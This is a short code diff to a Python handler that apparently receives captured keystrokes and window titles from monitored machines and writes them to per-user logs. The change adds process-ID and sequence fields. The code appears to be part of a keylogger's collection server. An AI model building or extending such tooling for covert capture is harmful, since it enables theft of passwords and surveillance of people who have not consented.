@@ -66,8 +66,10 @@ def handle_keystrokes(d):
     window     = d.get("window",     "")
     keystrokes = d.get("keystrokes", "").replace("\n", "[ENTER]").replace("\r", "")
     ts         = d.get("timestamp",  "")
-    line       = f"[{ts}] KEYSTROKES    Window={window}  Keys={keystrokes}"
-    logging.info("KEYSTROKES     User=%-20s Window=%s", user, window)
+    pid        = d.get("pid", "?")
+    seq        = d.get("seq", "?")
+    line       = f"[{ts}] KEYSTROKES    pid={pid} seq={seq}  Window={window}  Keys={keystrokes}"
+    logging.info("KEYSTROKES     User=%-20s pid=%s seq=%s Window=%s", user, pid, seq, window)
     write_user_log(user, line)
 
 
